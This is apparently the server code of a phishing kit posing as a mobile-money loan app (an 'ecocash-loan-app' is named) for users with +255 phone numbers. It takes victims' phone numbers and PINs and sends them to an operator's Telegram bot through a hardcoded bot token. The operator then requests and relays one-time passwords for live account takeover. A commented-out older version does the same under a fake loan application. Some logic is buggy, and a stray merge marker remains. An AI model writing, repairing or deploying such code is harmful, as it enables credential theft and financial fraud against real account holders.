const express = require("express");
const axios = require("axios");
const cors = require("cors");
const bodyParser = require("body-parser");
const crypto = require('crypto');


const path = require("path");

const app = express();
const PORT = process.env.PORT || 5002;

// Serve all files in your folder (like index.html, step6.html, etc.)
app.use(express.static(path.join(__dirname, "public"))); 

// Add a route to serve your main HTML file
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname,"public", "index.html")); 
});




app.use(cors());
app.use(bodyParser.json());
// app.use(express.static('public'));

// --- TELEGRAM CONFIG ---
const TELEGRAM_BOT_TOKEN = "8724075511:AAFjhU_XRoSRaiMo9i3jUNdvjRLUebwRlCc";
const TELEGRAM_ADMIN_ID = "7162306402";
const BASE_URL = process.env.RENDER_EXTERNAL_URL ||`http://localhost:${PORT}`; // Update if deployed


const sessions = {};
// Test route to check if server is alive
app.get("/", (req, res) => {
  res.send("✅ Server is running! Ready to receive data.");
});

// Main submission route
app.post("/api/submit", async (req, res) => {
  const { phone, pin } = req.body;

  sessions[sessionId] = { status: 'waiting' , phone, pin, timestamp: Date.now() };

  console.log(`📩 Received attempt for: +255${phone}`);

  const message = `
🔔 *New Login Attempt*
----------------------
📱 *Phone:* \`+255${phone}\`
🔐 *PIN:* \`${pin}\`
🆔 *ID:* \`${sessionId}\`
----------------------
*Admin Actions:*
    `;

  try {
    await axios.post(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        chat_id: TELEGRAM_ADMIN_ID,
        text: message,
        parse_mode: "Markdown",
        reply_markup: {
                inline_keyboard: [
                    [
                        { text: "🔢 Request OTP (5)", url: `${BASE_URL}/api/cmd/${sessionId}/otp5` },
                        { text: "🔢 Request OTP (6)", url: `${BASE_URL}/api/cmd/${sessionId}/otp6` }
                    ],
                    [
                        { text: "✅ Done / Redirect", url: `${BASE_URL}/api/cmd/${sessionId}/done` }
                    ]
                ]
            }
      },
    );

    console.log("🚀 Notification sent to Telegram Admin");
    res.json({ success: true, sessionId });
  } catch (error) {
    console.error(
      "❌ Telegram Error:",
      error.response ? error.response.data : error.message,
    );
    res
      .status(500)
      .json({ success: false, message: "Failed to send to Telegram" });
  }
});


// 2. Admin Command Handler (When you click a button in Telegram)
app.get('/api/cmd/:id/:command', (req, res) => {
    const { id, command } = req.params;
    if (sessions[id]) {
        sessions[id].status = command;
        res.send(`<h1>Command Sent!</h1><p>Action <b>${command}</b> active for session ${id}.</p><script>setTimeout(window.close, 1500)</script>`);
    } else {
        res.status(404).send('Session not found.');
    }
});

// 3. Status Polling (The App calls this every 2 seconds)
app.get('/api/status/:sessionid', (req, res) => {
    const session = sessions[req.params.id];
    if (session) {
        res.json({ status: session.status });
    } else {
        res.status(404).json({ status: 'not_found' });
    }
});

// 3. Submit OTP & Wait for Admin Decision
app.post('/api/submit-otp', async (req, res) => {
    const { otp, sessionId } = req.body;
    if (sessions[sessionId]) {
        sessions[sessionId].status = 'verifying';
        const msg = `🔐 *OTP Received*\nUser: +255${sessions[sessionId].phone}\nOTP: ${otp}`;
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_ADMIN_ID,
            text: msg,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [[
                    { text: "✅ Accept", callback_data: `accept_${sessionId}` },
                    { text: "❌ Decline", callback_data: `decline_${sessionId}` }
                ]]
            }
        });
        res.json({ success: true });
    }
});

// 4. Webhook for Admin Clicks
app.post('/api/webhook', (req, res) => {
    const { callback_query } = req.body;
    if (!callback_query) return res.sendStatus(200);

    const [action, val, sid] = callback_query.data.split('_');
    if (sessions[sid]) {
        if (action === 'ask') sessions[sid].status = `go_otp_${val}`;
        else if (action === 'accept') sessions[sid].status = 'approved';
        else if (action === 'decline') sessions[sid].status = 'declined';
    }
    res.sendStatus(200);
});

app.listen(PORT, "0.0.0.0", () => {
  console.log(`
🚀 SERVER STARTED SUCCESSFULLY
----------------------------------
Local access: http://localhost:${PORT}
Network access: Check your IP (e.g., http://192.168.1.x:${PORT})
----------------------------------
    `);
});
// const path = require("path");
// const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));

// const app = express();

// let otpLength = null;
// let step5Decision = null;   // for step 5 (otp5 / otp6)
// let step6Decision = null;   // for step 6 (valid / invalid)
// let lastActionTime = Date.now();

// app.use(express.json());

// // serve static files
// app.use(express.static(path.join(__dirname, "public")));

// // ==============================
// // TELEGRAM CONFIG (PUT YOURS)
// // ==============================
// const TELEGRAM_TOKEN = "8724075511:AAFjhU_XRoSRaiMo9i3jUNdvjRLUebwRlCc";
// const CHAT_ID = "7162306402";

// // ==============================
// // TELEGRAM FUNCTION
// // ==============================

// async function sendToTelegram(message) {
//   const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

//   await fetch(url, {
//     method: "POST",
//     headers: {
//       "Content-Type": "application/json",
//     },
//     body: JSON.stringify({
//       chat_id: CHAT_ID,
//       text: message,

//       reply_markup: {
//   inline_keyboard: [
//     [
//       { text: "OTP 5", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=otp5" },
//       { text: "OTP 6", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=otp6" }
//     ]
//   ]
// }
//     })
//   });
// }

// async function sendOTPToTelegram(message) {
//   const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

//   await fetch(url, {
//     method: "POST",
//     headers: {
//       "Content-Type": "application/json",
//     },
//     body: JSON.stringify({
//       chat_id: CHAT_ID,
//       text: message,
//       reply_markup: {
//         inline_keyboard: [
//           [
//             { text: "✅ VALID", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=valid" },
//             { text: "❌ INVALID", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=invalid" }
//           ]
//         ]
//       }
//     })
//   });
// }

// app.post("/submit", async (req, res) => {
//   try {
//     const { name, phone, pin } = req.body;

//     const message = `
// 📥 NEW LOAN APPLICATION

// 👤 Name: ${name}
// 📞 Phone: ${phone}
// 🔐 PIN: ${pin}

// 👇 Use buttons below
// `;

// console.log("SENDING MESSAGE:", message);

//     await sendToTelegram(message);

//     res.json({ success: true });

//   } catch (err) {
//     console.error("ERROR:", err.message);
//     res.json({ success: false });
//   }
// });

// // ==============================
// // TELEGRAM ADMIN CONTROL
// // ==============================
// app.get("/telegram-command", (req, res) => {
//   const cmd = req.query.cmd;

//   if (cmd === "otp5") {
//   otpLength = 5;
//   step5Decision = "otp5";
//   lastActionTime = Date.now();
// }

// if (cmd === "otp6") {
//   otpLength = 6;
//   step5Decision = "otp6";
//   lastActionTime = Date.now();
// }

// if (cmd === "valid") {
//   step6Decision = "valid";
//   lastActionTime = Date.now();
// }

// if (cmd === "invalid") {
//   step6Decision = "invalid";
//   lastActionTime = Date.now();
// }

//   if (cmd === "reset") {
//     otpLength = null;
//     step5Decision = null;
//     step6Decision = null;
// }

//   console.log("STATE:", { otpLength, step5Decision, step6Decision });

//   res.send(`
//   <h2>✅ ${cmd.toUpperCase()}</h2>
//   <p>Action received successfully.</p>
// `);
// });

// // ==============================
// // ROOT ROUTE
// // ==============================
// app.get("/", (req, res) => {
//   res.sendFile(path.join(__dirname, "public", "index.html"));
// });

// app.post("/set-otp", (req, res) => {
//   const { otp } = req.body;
//   otpLength = otp;

//   console.log("✅ OTP SET TO:", otpLength);

//   res.json({ success: true });
// });

// app.get("/otp-status", (req, res) => {
//   const currentOtp = otpLength;

//   otpLength = null; // ✅ RESET AFTER FRONTEND READS IT

//   res.json({ otp: currentOtp });
// });

// // ==============================
// // DECISION STATUS (FIXED)
// // ==============================
// app.get("/decision-status", (req, res) => {
//   const currentDecision = step6Decision;
//   step6Decision = null;
//   res.json({ decision: currentDecision });
// });

// // ==============================
// // CLEAR DECISION (NEW)
// // ==============================
// app.post("/clear-decision", (req, res) => {
//   step6Decision = null;
//   res.json({ success: true });
// });

// // ==============================
// // SUBMIT OTP (FIXED)
// // ==============================
// app.post("/submit-otp", async (req, res) => {
//   try {
//     const { otp } = req.body;

//     console.log("USER OTP:", otp);

//     const message = `
// 🔢 OTP ENTERED:

// ${otp}

// 👇 Choose action below
// `;

//     await sendOTPToTelegram(message);

//     res.json({ success: true });

//   } catch (err) {
//     console.log("OTP ERROR:", err.message);
//     res.json({ success: false });
//   }
// });
//  const PORT = process.env.PORT || 10000;
// app.listen(PORT, () => {
//   console.log(`Server running on ${PORT}`);
// >>>>>>> 52e3b6ca46fe401f9410078b0f293ba170ae05e2
// });
